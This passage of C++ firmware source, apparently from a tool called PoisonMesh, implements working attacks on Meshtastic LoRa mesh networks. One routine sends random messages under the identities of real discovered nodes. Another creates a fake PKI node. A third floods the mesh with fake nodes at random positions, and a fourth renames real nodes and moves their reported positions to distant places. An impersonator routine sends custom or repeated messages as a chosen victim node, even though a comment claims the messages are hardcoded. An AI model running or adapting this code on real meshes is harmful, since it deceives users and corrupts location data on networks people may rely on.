        }

        // ---- Leer teclado ----
        KeyEvent ev = keyboard_read();
        if (ev.type == Key::Escape) {
            radio_start_receive();
            return;
        }
        if (ev.type == Key::Enter) {
            active = !active;
            if (active) {
                last_active = !active;  // forzar redibujado
                g_radio.standby();
                last_tx = millis() - INTERVAL_MIN_MS;  // primer envio inmediato
            } else {
                radio_start_receive();
            }
        }

        // ---- Envio periodico ----
        if (active && node_count > 0 &&
            (millis() - last_tx >= cur_interval_ms)) {

            // Elegir nodo aleatorio de la lista (victima a suplantar)
            uint32_t victim_idx = esp_random() % node_count;
            DiscoveredNode& v = g_nodedb.nodes[victim_idx];

            // Largo aleatorio del mensaje (8..64 chars)
            uint8_t msg_len = 8 + (uint8_t)(esp_random() % 57);
            char msg[65];
            for (uint8_t i = 0; i < msg_len; i++) {
                msg[i] = ALPHABET[esp_random() % (sizeof(ALPHABET) - 1)];
            }
            msg[msg_len] = '\0';

            // Reconstruir el paquete en cada envio para que el packet id
            // sea unico (Meshtastic deduplica por from+id).
            MeshTxPacket pkt = mesh_build_packet(
                v.node_id,              // from = nodo victima (spoofing)
                MESH_BROADCAST_ADDR,   // to = broadcast
                PORTNUM_TEXT_MESSAGE,
                (const uint8_t*)msg, msg_len,
                MESH_DEFAULT_HOP_LIMIT, ch);

            if (pkt.valid) {
                radio_transmit(pkt.data, pkt.len);
                sent++;
                last_tx = millis();
                // Calcular el proximo delay aleatorio (2s..6s)
                uint32_t range = INTERVAL_MAX_MS - INTERVAL_MIN_MS + 1;
                cur_interval_ms = INTERVAL_MIN_MS + (esp_random() % range);
                Serial.printf("[ChattyMesh] %lu: from=%s (0x%08X) len=%u next=%lums\n",
                    sent, v.long_name, v.node_id, msg_len, cur_interval_ms);
            }
        }

        screen_toggle_tick();
        delay(50);
    }
}

// ============================================================
//  GhostMesh - nodo fantasma persistente + suplantacion
//
//  Genera un nodo fantasma UNICO con clave X25519 (Curve25519) en RAM.
//  El id del nodo se deriva de la clave publica: id = crc32(pubkey),
//  igual que un nodo Meshtastic real con PKI. El hardware es aleatorio
//  y el nombre largo/corto se eligen manualmente. Permite:
//    - Crear el nodo (genera claves + pide nombres al primer ingreso)
//    - Re-anunciar su NodeInfo (incluye la publica) manualmente
//    - Enviar un mensaje cualquiera suplantando ese id fantasma
//  El id y las claves persisten en RAM durante toda la sesion: se
//  puede reentrar y volver a enviar mensajes desde el mismo nodo.
//  Al reiniciar PoisonMesh se regenera un nodo fantasma nuevo.
// ============================================================
void screen_attack_ghostmesh() {
    uint8_t ch = mesh_channel_hash(g_loraCfg.presetIdx);

    // Si no existe todavia, crear el nodo fantasma persistente.
    // Se genera un par de claves X25519 en RAM; el id del nodo se deriva
    // de la clave publica (node_id = crc32(pubkey)), igual que un nodo
    // Meshtastic real con PKI. Los nombres se piden manualmente.
    if (!g_ghost_exists) {
        g_ghost_hw_model = random_hw_model();

        // Generar par de claves X25519 (privada/publica, 32 bytes c/u)
        uint8_t priv_key[32];
        if (!mesh_x25519_keypair(g_ghost_pub_key, priv_key)) {
            // Fallback: sin clave valida, id aleatorio y pubkey en cero
            g_ghost_id = mesh_random_node_id();
            memset(g_ghost_pub_key, 0, 32);
        } else {
            // node_id derivado de la clave publica (como Meshtastic real)
            g_ghost_id = crc32_ieee(g_ghost_pub_key, 32);
            if (g_ghost_id == 0) g_ghost_id = 1;
        }
        // La privada se descarta (opcion 1: no se usa para cifrar nada)

        // Nombre largo/corto por defecto (derivados del id)
        snprintf(g_ghost_long_name,  sizeof(g_ghost_long_name),
            "Ghost-%04X", (uint16_t)g_ghost_id);
        snprintf(g_ghost_short_name, sizeof(g_ghost_short_name),
            "G%03X", (uint16_t)g_ghost_id & 0xFFF);

        // Pedir nombres manualmente (editable, Enter confirma)
        if (!screen_text_input("Nombre largo:", g_ghost_long_name,
                sizeof(g_ghost_long_name))) {
            return;  // cancelado: no se crea el nodo
        }
        if (!screen_text_input("Nombre corto:", g_ghost_short_name,
                sizeof(g_ghost_short_name))) {
            return;
        }

        g_ghost_exists = true;
    }

    // Opciones del menu del ataque
    enum GhostOpt { OPT_BACK = 0, OPT_SEND, OPT_ANNOUNCE };
    static const char* OPTIONS[] = { "< Volver", "Enviar mensaje", "Re-anunciar nodo" };
    static const uint8_t OPT_COUNT = 3;
    uint8_t sel = OPT_SEND;

    while (true) {
        // ---- Dibujar pantalla ----
        M5.Display.fillScreen(COL_BG);
        M5.Display.fillRect(0, 0, LCD_WIDTH, UI_HEADER_H, COL_HEADER_BG);
        M5.Display.setFont(&fonts::Font0);
        M5.Display.setTextColor(COL_ACCENT);
        M5.Display.setTextDatum(ML_DATUM);
        M5.Display.drawString("PM| GhostMesh", 3, UI_HEADER_H/2);
        M5.Display.drawFastHLine(0, UI_HEADER_H-1, LCD_WIDTH, COL_ACCENT);

        // Info del nodo fantasma (fuente chica, todo compacto)
        M5.Display.setFont(&fonts::Font0);
        M5.Display.setTextDatum(ML_DATUM);
        M5.Display.setTextColor(COL_TEXT_DIM);
        M5.Display.drawString("Nodo fantasma:", 4, UI_CONTENT_Y + 6);
        M5.Display.setTextColor(COL_ACCENT);
        M5.Display.drawString(g_ghost_long_name, 4, UI_CONTENT_Y + 16);
        M5.Display.setTextColor(COL_TEXT_DIM);
        char id_line[56];
        snprintf(id_line, sizeof(id_line), "id: !%08x  hw: %lu",
            g_ghost_id, g_ghost_hw_model);
        M5.Display.drawString(id_line, 4, UI_CONTENT_Y + 26);

        // Pubkey (primeros 8 bytes, indica que el nodo tiene PKI)
        M5.Display.setTextColor(COL_TEXT_DIM);
        char pk_line[40];
        snprintf(pk_line, sizeof(pk_line), "pki: %02X%02X%02X%02X%02X%02X%02X%02X...",
            g_ghost_pub_key[0], g_ghost_pub_key[1], g_ghost_pub_key[2], g_ghost_pub_key[3],
            g_ghost_pub_key[4], g_ghost_pub_key[5], g_ghost_pub_key[6], g_ghost_pub_key[7]);
        M5.Display.drawString(pk_line, 4, UI_CONTENT_Y + 36);

        // Opciones (compactas, todas visibles en una sola pantalla)
        int optY0 = UI_CONTENT_Y + 40;
        for (uint8_t i = 0; i < OPT_COUNT; i++) {
            int y = optY0 + i * 16;
            bool isSel = (i == sel);
            if (isSel) M5.Display.fillRect(0, y, LCD_WIDTH, 14, COL_SEL_BG);
            M5.Display.setFont(&fonts::Font0);
            M5.Display.setTextColor(isSel ? COL_ACCENT : COL_TEXT);
            M5.Display.setTextDatum(ML_DATUM);
            char row[24];
            snprintf(row, sizeof(row), "%s %s", isSel ? ">" : " ", OPTIONS[i]);
            M5.Display.drawString(row, 4, y + 7);
        }

        // Footer
        int fy = LCD_HEIGHT - UI_FOOTER_H;
        M5.Display.fillRect(0, fy, LCD_WIDTH, UI_FOOTER_H, COL_HEADER_BG);
        M5.Display.setFont(&fonts::Font0);
        M5.Display.setTextColor(COL_TEXT_DIM);
        M5.Display.setTextDatum(MC_DATUM);
        M5.Display.drawString("Fn+=nav  Enter=OK  `=salir", LCD_WIDTH/2, fy + UI_FOOTER_H/2);

        KeyEvent ev = keyboard_wait();
        if (ev.type == Key::Escape) { radio_start_receive(); return; }
        if (ev.type == Key::Up   && sel > 0)           sel--;
        if (ev.type == Key::Down && sel < OPT_COUNT-1) sel++;
        if (ev.type == Key::Enter) {
            if (sel == OPT_BACK) {
                radio_start_receive();
                return;
            }
            else if (sel == OPT_ANNOUNCE) {
                // Re-anunciar el NodeInfo del nodo fantasma (1 envio)
                uint8_t user_buf[128];
                size_t user_len = proto_build_user(user_buf, sizeof(user_buf),
                    g_ghost_id, g_ghost_long_name, g_ghost_short_name,
                    g_ghost_hw_model, g_ghost_pub_key, 32);
                if (user_len > 0) {
                    MeshTxPacket pkt = mesh_build_packet(
                        g_ghost_id, MESH_BROADCAST_ADDR,
                        PORTNUM_NODEINFO, user_buf, user_len,
                        MESH_DEFAULT_HOP_LIMIT, ch);
                    if (pkt.valid) radio_transmit(pkt.data, pkt.len);
                }
                M5.Display.fillScreen(COL_BG);
                M5.Display.setFont(&fonts::FreeSans9pt7b);
                M5.Display.setTextColor(COL_OK);
                M5.Display.setTextDatum(MC_DATUM);
                M5.Display.drawString("Nodo anunciado", LCD_WIDTH/2, 50);
                delay(900);
            }
            else { // OPT_SEND
                // Enviar un mensaje cualquiera suplantando al ghost
                static char msg_buf[200];
                static char prompt_buf[48];
                msg_buf[0] = '\0';
                snprintf(prompt_buf, sizeof(prompt_buf), "Mensaje de %s", g_ghost_long_name);
                if (!screen_text_input(prompt_buf,
                        msg_buf, sizeof(msg_buf))) {
                    continue;  // cancelado
                }
                if (msg_buf[0] == '\0') continue;  // vacio

                size_t plen = strlen(msg_buf);
                MeshTxPacket pkt = mesh_build_packet(
                    g_ghost_id, MESH_BROADCAST_ADDR,
                    PORTNUM_TEXT_MESSAGE,
                    (const uint8_t*)msg_buf, plen,
                    MESH_DEFAULT_HOP_LIMIT, ch);

                M5.Display.fillScreen(COL_BG);
                M5.Display.setFont(&fonts::FreeSans9pt7b);
                M5.Display.setTextDatum(MC_DATUM);
                if (pkt.valid) {
                    radio_transmit(pkt.data, pkt.len);
                    M5.Display.setTextColor(COL_OK);
                    M5.Display.drawString("Mensaje enviado!", LCD_WIDTH/2, 45);
                    M5.Display.setFont(&fonts::Font0);
                    M5.Display.setTextColor(COL_TEXT_DIM);
                    char id_buf[24];
                    snprintf(id_buf, sizeof(id_buf), "from: !%08x", g_ghost_id);
                    M5.Display.drawString(id_buf, LCD_WIDTH/2, 68);
                } else {
                    M5.Display.setTextColor(COL_DANGER);
                    M5.Display.drawString("Error al construir paquete", LCD_WIDTH/2, 50);
                }
                M5.Display.setFont(&fonts::Font0);
                M5.Display.setTextColor(COL_TEXT_DIM);
                M5.Display.drawString("Presiona cualquier tecla...", LCD_WIDTH/2, 90);
                keyboard_wait();
            }
        }

        screen_toggle_tick();
        delay(50);
    }
}

void screen_attack_meshgrow() {
    uint8_t ch      = mesh_channel_hash(g_loraCfg.presetIdx);
    bool    active  = false;
    uint32_t sent   = 0;
    uint32_t last_tx = 0;
    const uint32_t INTERVAL_MS = 10000;

    // Dibujar estaticos una sola vez
    M5.Display.fillScreen(COL_BG);
    M5.Display.fillRect(0, 0, LCD_WIDTH, UI_HEADER_H, COL_HEADER_BG);
    M5.Display.setFont(&fonts::Font0);
    M5.Display.setTextColor(COL_ACCENT);
    M5.Display.setTextDatum(ML_DATUM);
    M5.Display.drawString("PM| MeshGrow", 3, UI_HEADER_H/2);
    M5.Display.drawFastHLine(0, UI_HEADER_H-1, LCD_WIDTH, COL_ACCENT);
    int fy = LCD_HEIGHT - UI_FOOTER_H;
    M5.Display.fillRect(0, fy, LCD_WIDTH, UI_FOOTER_H, COL_HEADER_BG);
    M5.Display.setTextColor(COL_TEXT_DIM);
    M5.Display.setTextDatum(MC_DATUM);
    M5.Display.drawString("Enter=ON/OFF   `=salir", LCD_WIDTH/2, fy + UI_FOOTER_H/2);

    bool     last_active = !active;   // forzar primer dibujo
    uint32_t last_sent   = 0xFFFFFFFF;
    uint32_t last_next_s = 0xFFFFFFFF;

    while (true) {
        // ---- Solo redibujar zonas dinamicas si cambiaron ----
        uint32_t elapsed = millis() - last_tx;
        uint32_t next_s  = (active && elapsed < INTERVAL_MS)
            ? (INTERVAL_MS - elapsed) / 1000 + 1 : 0;

        bool state_changed  = (active != last_active);
        bool count_changed  = (sent   != last_sent);
        bool timer_changed  = (active && next_s != last_next_s);

        if (state_changed) {
            // Estado ON/OFF
            M5.Display.fillRect(0, UI_CONTENT_Y + 6, LCD_WIDTH, 20, COL_BG);
            M5.Display.setFont(&fonts::FreeSans9pt7b);
            M5.Display.setTextDatum(MC_DATUM);
            if (active) {
                M5.Display.setTextColor(COL_OK);
                M5.Display.drawString("[ ACTIVO ]", LCD_WIDTH/2, UI_CONTENT_Y + 18);
            } else {
                M5.Display.setTextColor(COL_TEXT_DIM);
                M5.Display.drawString("[ DETENIDO ]", LCD_WIDTH/2, UI_CONTENT_Y + 18);
                // Limpiar timer al detener
                M5.Display.fillRect(0, UI_CONTENT_Y + 50, LCD_WIDTH, 20, COL_BG);
            }
            last_active = active;
        }

        if (count_changed) {
            char buf[32];
            snprintf(buf, sizeof(buf), "Nodos: %lu", sent);
            M5.Display.fillRect(0, UI_CONTENT_Y + 30, LCD_WIDTH, 20, COL_BG);
            M5.Display.setFont(&fonts::FreeSans9pt7b);
            M5.Display.setTextDatum(MC_DATUM);
            M5.Display.setTextColor(sent > 0 ? COL_ACCENT : COL_TEXT_DIM);
            M5.Display.drawString(buf, LCD_WIDTH/2, UI_CONTENT_Y + 42);
            last_sent = sent;
        }

        if (timer_changed) {
            char buf[32];
            snprintf(buf, sizeof(buf), "Proximo en %lu s", next_s);
            M5.Display.fillRect(0, UI_CONTENT_Y + 50, LCD_WIDTH, 20, COL_BG);
            M5.Display.setFont(&fonts::FreeSans9pt7b);
            M5.Display.setTextDatum(MC_DATUM);
            M5.Display.setTextColor(COL_WARNING);
            M5.Display.drawString(buf, LCD_WIDTH/2, UI_CONTENT_Y + 62);
            last_next_s = next_s;
        }

        // ---- Leer teclado ----
        KeyEvent ev = keyboard_read();

        if (ev.type == Key::Escape) {
            // Salir - reactivar sniffer
            radio_start_receive();
            return;
        }

        if (ev.type == Key::Enter) {
            active = !active;
            if (active) {
                // Al activar: pausar sniffer y disparar primera inyeccion ya
                g_radio.standby();
                last_tx = millis() - INTERVAL_MS;  // forzar TX inmediato
            } else {
                // Al desactivar: volver a RX
                radio_start_receive();
            }
        }

        // ---- Inyeccion periodica ----
        if (active && (millis() - last_tx >= INTERVAL_MS)) {
            // Coordenadas aleatorias validas
            float lat = ((float)(int32_t)(esp_random() % 160000000) / 1000000.0f) - 80.0f;
            float lon = ((float)(int32_t)(esp_random() % 360000000) / 1000000.0f) - 180.0f;

            // Node ID y nombre aleatorios
            uint32_t fake_id = mesh_random_node_id();
            char long_name[24], short_name[5];
            snprintf(long_name,  sizeof(long_name),  "Node-%04X", (uint16_t)fake_id);
            snprintf(short_name, sizeof(short_name), "%04X",      (uint16_t)fake_id);

            // Construir User + Position en dos paquetes separados
            uint8_t user_buf[128];
            size_t user_len = proto_build_user(user_buf, sizeof(user_buf),
                fake_id, long_name, short_name, random_hw_model());

            if (user_len > 0) {
                MeshTxPacket pkt = mesh_build_packet(fake_id, MESH_BROADCAST_ADDR,
                    PORTNUM_NODEINFO, user_buf, user_len,
                    MESH_DEFAULT_HOP_LIMIT, ch);
                if (pkt.valid) radio_transmit(pkt.data, pkt.len);
            }

            // Position con coords aleatorias
            uint8_t pos_buf[64];
            size_t pos_len = proto_build_position(pos_buf, sizeof(pos_buf),
                lat, lon, (int32_t)(esp_random() % 500));
            if (pos_len > 0) {
                MeshTxPacket pkt = mesh_build_packet(fake_id, MESH_BROADCAST_ADDR,
                    PORTNUM_POSITION, pos_buf, pos_len,
                    MESH_DEFAULT_HOP_LIMIT, ch);
                if (pkt.valid) radio_transmit(pkt.data, pkt.len);
            }

            sent++;
            last_tx = millis();

            Serial.printf("[MeshGrow] Nodo #%lu: %s lat=%.4f lon=%.4f\n",
                sent, long_name, lat, lon);
        }

                screen_toggle_tick();
delay(100);
    }
}

// ============================================================
//  Mesh Move - reubicacion automatica de nodos descubiertos
//
//  Logica pasiva/activa:
//  - El radio SIEMPRE esta en RX entre ataques + sigue descubriendo nodos
//  - Al activar: espera 1 minuto antes del primer ataque
//  - Cada 30s: ataca el nodo actual (Namechange + Position), avanza al siguiente
//  - Itera ciclicamente por todos los nodos del NodeDB
//  - Toggle ON/OFF con Enter, salir con `
// ============================================================
void screen_attack_meshmove() {
    uint8_t ch = mesh_channel_hash(g_loraCfg.presetIdx);

    struct MoveTarget { const char* name; float lat; float lon; int32_t alt; };
    static const MoveTarget TARGETS[] = {
        { "Malvinas",  -51.7963f,  -59.5236f,   0 },
        { "Egipto",     29.9792f,   31.1342f,  60 },
        { "Australia", -25.2744f,  133.7751f, 300 },
        { "Roma",       41.8902f,   12.4922f,  21 },
    };
    static const uint8_t TARGET_COUNT = 4;

    bool     active        = false;
    uint32_t total_moved   = 0;
    uint8_t  node_cursor   = 0;
    uint8_t  target_idx    = 0;
    uint32_t activated_at  = 0;   // cuando se activo
    uint32_t last_action   = 0;   // cuando fue el ultimo ataque

    const uint32_t WAIT_FIRST_MS = 60000;  // 1 minuto antes del primer ataque
    const uint32_t REPEAT_MS     = 30000;  // 30s entre ataques

    // Asegurar RX activo al entrar
    radio_start_receive();

    // Dibujar estaticos
    M5.Display.fillScreen(COL_BG);
    M5.Display.fillRect(0, 0, LCD_WIDTH, UI_HEADER_H, COL_HEADER_BG);
    M5.Display.setFont(&fonts::Font0);
    M5.Display.setTextColor(COL_ACCENT);
    M5.Display.setTextDatum(ML_DATUM);
    M5.Display.drawString("PM| Mesh Move", 3, UI_HEADER_H/2);
    M5.Display.drawFastHLine(0, UI_HEADER_H-1, LCD_WIDTH, COL_ACCENT);
    int fy = LCD_HEIGHT - UI_FOOTER_H;
    M5.Display.fillRect(0, fy, LCD_WIDTH, UI_FOOTER_H, COL_HEADER_BG);
    M5.Display.setTextColor(COL_TEXT_DIM);
    M5.Display.setTextDatum(MC_DATUM);
    M5.Display.drawString("Enter=ON/OFF   `=salir", LCD_WIDTH/2, fy + UI_FOOTER_H/2);

    // Variables anti-flickering
    bool     last_active     = !active;
    uint32_t last_total      = 0xFFFFFFFF;
    uint8_t  last_cursor     = 0xFF;
    uint32_t last_countdown  = 0xFFFFFFFF;
    uint8_t  last_node_count = 0xFF;

    while (true) {
        uint32_t now        = millis();
        uint8_t  node_count = g_nodedb.count;

        // Procesar paquetes entrantes ? actualizar NodeDB
        if (radio_packet_available()) {
            RawPacket pkt;
            if (radio_read_packet(pkt) == RadioResult::OK)
                g_nodedb.process_packet(pkt);
        }

        // Calcular countdown
        uint32_t countdown = 0;
        bool in_warmup = false;
        if (active && node_count > 0) {
            if (last_action == 0) {
                // Esperando el primer minuto
                in_warmup = true;
                uint32_t elapsed = now - activated_at;
                countdown = elapsed >= WAIT_FIRST_MS ? 0
                    : (WAIT_FIRST_MS - elapsed) / 1000 + 1;
            } else {
                uint32_t elapsed = now - last_action;
                countdown = elapsed >= REPEAT_MS ? 0
                    : (REPEAT_MS - elapsed) / 1000 + 1;
            }
        }

        // ---- Redibujado selectivo ----

        if (active != last_active) {
            M5.Display.fillRect(0, UI_CONTENT_Y + 2, LCD_WIDTH, 18, COL_BG);
            M5.Display.setFont(&fonts::FreeSans9pt7b);
            M5.Display.setTextDatum(MC_DATUM);
            M5.Display.setTextColor(active ? COL_OK : COL_TEXT_DIM);
            M5.Display.drawString(active ? "[ ACTIVO ]" : "[ DETENIDO ]",
                LCD_WIDTH/2, UI_CONTENT_Y + 13);
            last_active = active;
            last_cursor = 0xFF; // forzar redibujado del nodo
        }

        if (node_count != last_node_count || node_cursor != last_cursor) {
            M5.Display.fillRect(0, UI_CONTENT_Y + 22, LCD_WIDTH, 36, COL_BG);
            M5.Display.setFont(&fonts::Font0);
            M5.Display.setTextDatum(MC_DATUM);
            if (node_count == 0) {
                M5.Display.setTextColor(COL_TEXT_DIM);
                M5.Display.drawString("Escuchando nodos...", LCD_WIDTH/2, UI_CONTENT_Y + 34);
            } else {
                if (node_cursor >= node_count) node_cursor = 0;
                M5.Display.setTextColor(COL_ACCENT);
                char line1[40];
                snprintf(line1, sizeof(line1), "%u/%u: %s",
                    node_cursor + 1, node_count,
                    g_nodedb.nodes[node_cursor].long_name);
                M5.Display.drawString(line1, LCD_WIDTH/2, UI_CONTENT_Y + 30);
                if (active) {
                    M5.Display.setTextColor(COL_WARNING);
                    char line2[24];
                    snprintf(line2, sizeof(line2), "-> %s", TARGETS[target_idx].name);
                    M5.Display.drawString(line2, LCD_WIDTH/2, UI_CONTENT_Y + 46);
                }
            }
            last_cursor     = node_cursor;
            last_node_count = node_count;
        }

        if (total_moved != last_total || countdown != last_countdown) {
            M5.Display.fillRect(0, UI_CONTENT_Y + 58, LCD_WIDTH, 36, COL_BG);
            M5.Display.setFont(&fonts::Font0);
            M5.Display.setTextDatum(MC_DATUM);
            char buf[40];
            snprintf(buf, sizeof(buf), "Ataques: %lu", total_moved);
            M5.Display.setTextColor(total_moved > 0 ? COL_OK : COL_TEXT_DIM);
            M5.Display.drawString(buf, LCD_WIDTH/2, UI_CONTENT_Y + 68);
            if (active && node_count > 0 && countdown > 0) {
                snprintf(buf, sizeof(buf),
                    in_warmup ? "Inicio en %lu s" : "Proximo en %lu s",
                    countdown);
                M5.Display.setTextColor(COL_WARNING);
                M5.Display.drawString(buf, LCD_WIDTH/2, UI_CONTENT_Y + 82);
            }
            last_total     = total_moved;
            last_countdown = countdown;
        }

        // ---- Teclado ----
        KeyEvent ev = keyboard_read();
        if (ev.type == Key::Escape) {
            radio_start_receive();
            return;
        }
        if (ev.type == Key::Enter) {
            active = !active;
            last_active = !active;
            if (active) {
                activated_at = now;
                last_action  = 0;  // 0 = aun no ataco ? usar warmup
                node_cursor  = 0;
                target_idx   = 0;
                last_cursor  = 0xFF;
            }
        }

        // ---- Logica de ataque ----
        if (active && node_count > 0) {
            if (node_cursor >= node_count) node_cursor = 0;

            bool fire = false;
            if (last_action == 0) {
                fire = (now - activated_at >= WAIT_FIRST_MS);
            } else {
                fire = (now - last_action >= REPEAT_MS);
            }

            if (fire) {
                DiscoveredNode& t = g_nodedb.nodes[node_cursor];

                // Namechange ? "Moved" / "MOV"
                uint8_t user_buf[128];
                size_t user_len = proto_build_user(user_buf, sizeof(user_buf),
                    t.node_id, "Moved", "MOV", random_hw_model());
                if (user_len > 0) {
                    MeshTxPacket pkt = mesh_build_packet(
                        t.node_id, MESH_BROADCAST_ADDR,
                        PORTNUM_NODEINFO, user_buf, user_len,
                        MESH_DEFAULT_HOP_LIMIT, ch);
                    if (pkt.valid) radio_transmit(pkt.data, pkt.len);
                }

                // Position Poison > destino actual
                uint8_t pos_buf[64];
                size_t pos_len = proto_build_position(pos_buf, sizeof(pos_buf),
                    TARGETS[target_idx].lat,
                    TARGETS[target_idx].lon,
                    TARGETS[target_idx].alt);
                if (pos_len > 0) {
                    MeshTxPacket pkt = mesh_build_packet(
                        t.node_id, MESH_BROADCAST_ADDR,
                        PORTNUM_POSITION, pos_buf, pos_len,
                        MESH_DEFAULT_HOP_LIMIT, ch);
                    if (pkt.valid) radio_transmit(pkt.data, pkt.len);
                }

                Serial.printf("[MeshMove] %s -> %s\n",
                    t.long_name, TARGETS[target_idx].name);

                total_moved++;
                last_action  = now;
                last_cursor  = 0xFF;

                // Avanzar nodo y destino
                node_cursor = (node_cursor + 1) % node_count;
                target_idx  = (target_idx  + 1) % TARGET_COUNT;

                // Volver a RX inmediatamente tras el TX
                radio_start_receive();
            }
        }

                screen_toggle_tick();
delay(100);
    }
}

// =================================================================================================
//  Mesh Impersonator - envia mensaje de test con identidad
//  de un nodo real seleccionado de la lista
//
//  Los mensajes están hardcodeados para prevenir que se convierta en una herramienta de spoofing
//  El from del paquete es el node_id del nodo seleccionado
//  Demuestra el vector de spoofing de mensajes de texto
// ===================================================================================================
void screen_attack_impersonator() {
    uint8_t ch = mesh_channel_hash(g_loraCfg.presetIdx);


    // 1. Seleccionar nodo victima
    int idx = screen_node_list("Impersonator - Nodo", true);
    if (idx < 0) return;
    DiscoveredNode& t = g_nodedb.nodes[idx];
    // 2. Seleccionar mensaje (predefinido o personalizado)
    struct TestMsg { const char* label; const char* text; };
    static const TestMsg MESSAGES[] = {
        { "Tecnico",   "[TEST] PoisonMesh by Teno | Este mensaje es una prueba de seguridad" },
        { "Demo",      "[DEMO] Este mensaje fue enviado por PoisonMesh, NO por este nodo" },
        { "CVE",       "[CVE-DEMO] Meshtastic permite spoofing de mensajes | PoisonMesh by Teno" },
        { "Impacto",   "[POISONMESH] Spoofing activo | Este nodo fue suplantado | PoisonMesh by Teno" },
    };
    static const uint8_t MSG_COUNT    = sizeof(MESSAGES) / sizeof(MESSAGES[0]);
    static const uint8_t CUSTOM_INDEX = MSG_COUNT;    // indice de "Personalizado"
    static const uint8_t TOTAL_ITEMS  = MSG_COUNT + 1;
    static const uint8_t ROW_H = 20;
    uint8_t msg_sel = 0;

    // Limpiar tras node list
    M5.Display.fillScreen(COL_BG);
    delay(50);

    while (true) {
        M5.Display.fillScreen(COL_BG);
        M5.Display.fillRect(0, 0, LCD_WIDTH, UI_HEADER_H, COL_HEADER_BG);
        M5.Display.setFont(&fonts::Font0);
        M5.Display.setTextColor(COL_ACCENT);
        M5.Display.setTextDatum(ML_DATUM);
        M5.Display.drawString("PM| Seleccionar mensaje", 3, UI_HEADER_H/2);
        M5.Display.drawFastHLine(0, UI_HEADER_H-1, LCD_WIDTH, COL_ACCENT);

        for (uint8_t i = 0; i < TOTAL_ITEMS; i++) {
            int y = UI_CONTENT_Y + 4 + i * ROW_H;
            bool sel = (i == msg_sel);
            if (sel) M5.Display.fillRect(0, y, LCD_WIDTH, ROW_H-2, COL_SEL_BG);

            const char* label = (i == CUSTOM_INDEX)
                ? "Personalizado" : MESSAGES[i].label;
            const char* text  = (i == CUSTOM_INDEX)
                ? "Escribir mensaje propio..." : MESSAGES[i].text;

            M5.Display.setTextColor(sel ? COL_ACCENT : COL_TEXT);
            M5.Display.setTextDatum(ML_DATUM);
            char row[16]; snprintf(row, sizeof(row), "%s %s",
                sel ? ">" : " ", label);
            M5.Display.drawString(row, 4, y + ROW_H/2 - 4);
            // Preview del mensaje en letra mas chica
            M5.Display.setTextColor(sel ? COL_TEXT : COL_TEXT_DIM);
            char preview[40];
            strncpy(preview, text, 38);
            preview[38] = '\0';
            M5.Display.drawString(preview, 6, y + ROW_H/2 + 4);
        }

        int fy0 = LCD_HEIGHT - UI_FOOTER_H;
        M5.Display.fillRect(0, fy0, LCD_WIDTH, UI_FOOTER_H, COL_HEADER_BG);
        M5.Display.setTextColor(COL_TEXT_DIM);
        M5.Display.setTextDatum(MC_DATUM);
        M5.Display.drawString("Fn+;.=nav  Enter=OK  `=cancelar",
            LCD_WIDTH/2, fy0 + UI_FOOTER_H/2);

        KeyEvent ev = keyboard_wait();
        if (ev.type == Key::Escape) return;
        if (ev.type == Key::Enter)  break;
        if (ev.type == Key::Up   && msg_sel > 0)              msg_sel--;
        if (ev.type == Key::Down && msg_sel < TOTAL_ITEMS-1)  msg_sel++;
    }

    // Texto final: predefinido o personalizado
    static char custom_buf[200];
    const char* TEST_MSG = nullptr;
    if (msg_sel == CUSTOM_INDEX) {
        custom_buf[0] = '\0';
        if (!screen_text_input("Mensaje personalizado:",
                custom_buf, sizeof(custom_buf))) {
            return;  // cancelado
        }
        if (custom_buf[0] == '\0') return;  // vacio
        TEST_MSG = custom_buf;
    } else {
        TEST_MSG = MESSAGES[msg_sel].text;
    }

    // Pantalla de confirmacion mostrando que se va a enviar
    M5.Display.fillScreen(COL_BG);
    M5.Display.fillRect(0, 0, LCD_WIDTH, UI_HEADER_H, COL_HEADER_BG);
    M5.Display.setFont(&fonts::Font0);
    M5.Display.setTextColor(COL_ACCENT);
    M5.Display.setTextDatum(ML_DATUM);
    M5.Display.drawString("PM| Mesh Impersonator", 3, UI_HEADER_H/2);
    M5.Display.drawFastHLine(0, UI_HEADER_H-1, LCD_WIDTH, COL_ACCENT);

    M5.Display.setFont(&fonts::FreeSans9pt7b);
    M5.Display.setTextDatum(MC_DATUM);

    M5.Display.setTextColor(COL_TEXT_DIM);
    M5.Display.drawString("Enviando como:", LCD_WIDTH/2, UI_CONTENT_Y + 14);
    M5.Display.setTextColor(COL_ACCENT);
    M5.Display.drawString(t.long_name, LCD_WIDTH/2, UI_CONTENT_Y + 32);

    M5.Display.setTextColor(COL_TEXT_DIM);
    M5.Display.drawString("Mensaje:", LCD_WIDTH/2, UI_CONTENT_Y + 52);
    M5.Display.setTextColor(COL_OK);
    M5.Display.setFont(&fonts::Font0);
    M5.Display.drawString(TEST_MSG, LCD_WIDTH/2, UI_CONTENT_Y + 66);

    int fy = LCD_HEIGHT - UI_FOOTER_H;
    M5.Display.fillRect(0, fy, LCD_WIDTH, UI_FOOTER_H, COL_HEADER_BG);
    M5.Display.setTextColor(COL_TEXT_DIM);
    M5.Display.drawString("Enter=enviar  `=cancelar", LCD_WIDTH/2, fy + UI_FOOTER_H/2);

    KeyEvent ev = keyboard_wait();
    if (ev.type == Key::Escape) return;

    // 3. Cantidad de mensajes a enviar (default 1)
    uint32_t count = screen_number_input("Cantidad de mensajes", 1, 1, 100);
    if (count == 0) count = 1;

    // 4. Construir y enviar el paquete de texto (N veces)
    // PORTNUM_TEXT_MESSAGE = 1, payload = texto UTF-8 plano (sin protobuf)
    const uint8_t* payload = (const uint8_t*)TEST_MSG;
    size_t payload_len = strlen(TEST_MSG);

    // Si hay mas de un mensaje, dibujar pantalla de progreso con cancelacion
    bool cancelled = false;
    if (count > 1) {
        for (uint32_t i = 0; i < count; i++) {
            // CRITICO: reconstruir el paquete en cada iteracion para que cada
            // mensaje tenga un packet id distinto. Meshtastic deduplica por
            // (from, id): si reenviamos el MISMO id, los nodos descartan los
            // duplicados como ya vistos (PacketHistory::wasSeenRecently).
            MeshTxPacket pkt = mesh_build_packet(
                t.node_id,              // from = nodo victima (spoofing)
                MESH_BROADCAST_ADDR,   // to = broadcast
                PORTNUM_TEXT_MESSAGE,
                payload, payload_len,
                MESH_DEFAULT_HOP_LIMIT, ch);

            if (!pkt.valid) { cancelled = true; break; }
            radio_transmit(pkt.data, pkt.len);
            Serial.printf("[Impersonator] (%lu/%lu) enviado como: %s (0x%08X)\n",
                i + 1, count, t.long_name, t.node_id);

            // Progreso en pantalla
            M5.Display.fillScreen(COL_BG);
            M5.Display.setFont(&fonts::FreeSans9pt7b);
